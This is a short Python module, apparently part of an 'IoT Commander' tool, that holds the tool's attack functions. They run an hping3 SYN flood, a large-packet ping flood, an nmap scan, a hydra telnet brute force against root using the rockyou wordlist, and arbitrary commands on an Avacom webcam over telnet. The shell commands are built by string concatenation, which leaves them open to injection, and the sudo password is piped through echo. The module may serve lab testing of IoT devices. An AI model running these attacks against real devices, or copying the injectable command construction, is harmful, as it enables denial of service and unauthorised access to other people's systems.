"""
attacks.py
Thomas Setzler

This file contains all the attack modules that will be used within the IoT Commander code.
All parameters are assumed to be in the format specified within the "< >"
"""


import os
import AvacomControl
import time


def hPing3(ip, packets, pwd):
    """
    This method performs an hPing3 attack on a specified ip with a specified numer of packets.  
    Parameters:
        ip: <string> target ip address for attack
        packets: <integer> number of packets to send. Recommended at least 1 million
        pwd: <string> sudo password for machine running the attack
    """

    command = 'hping3 -S -c ' + str(packets) +  ' --faster ' + ip
    os.system('echo %s|sudo -S %s' % (str(pwd), command))
#end hPing3



def ping(ip, packetSize, count):
    """
    This method performs a ping attack on a specified ip address, with customizable ping sizes and counts.
    Parameters:
        ip: <string> target ip adddress for attack
        packetSize: <integer> size of packet to be sent in attack.  Recommended was 65507
        count: <integer> number of packets to be sent.  
    """
    command = 'ping -s ' + str(packetSize) + ' -c ' + str(count) +  ' ' + ip

    os.system(command)


#end ping

def scanning(ip):
    """
    This performs a scan on the specified ip address.
    Parameters: 
        ip: <string> ip address of device to scan
    """   
    command = 'nmap -vv ' + ip
    os.system(command)

#end scanning
def bruteForce(ip, pwdFile, pwd):
    """
    This method performs a brute force attack on the specified ip address.
        Parameters:
        ip: <string> ip address to attack
        pwdFile: <string> name of file, complete with .txt, of passwords to perform attack with
        pwd: <string> sudo password for machine running attack
    """
      
    command = 'hydra -l root -P rockyou.txt telnet://' + ip
    os.system('echo %s|sudo -S %s' % (str(pwd), command))

#end bruteForce

def avacomCommand(ip, command):
    """
    This method passes a terminal command to the avacom webcam via telnet
        Parameters:
        ip: <string> ip address of the avacom webcam
        command: <string> command to be executed on the avacom webcam
    """
    tn = AvacomControl.telnetIntoAvacom(ip)
    time.sleep(10)
    tn.write(command)
    
    time.sleep(10)
#end avacomCommand


#avacomCommand("10.0.0.12","ping -s 5000 -c 100 10.0.0.4")
#print("done")







